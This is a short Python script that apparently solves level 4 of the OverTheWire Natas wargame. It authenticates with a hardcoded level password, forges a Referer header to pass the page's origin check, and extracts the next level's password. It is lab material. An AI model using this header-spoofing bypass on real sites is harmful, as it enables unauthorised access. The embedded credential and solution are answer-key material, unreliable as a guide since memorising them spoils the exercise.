#!/usr/bin/env python3

import requests
import re

req = requests.Session()

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
url = "http://%s.natas.labs.overthewire.org" % username

header = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
req_get = req.get(url+"/index.php",auth=(username,password),headers=header)

# print(req_get.text)

nxt_pass = re.findall("The password for natas5 is (.*)",req_get.text)
print(nxt_pass[0])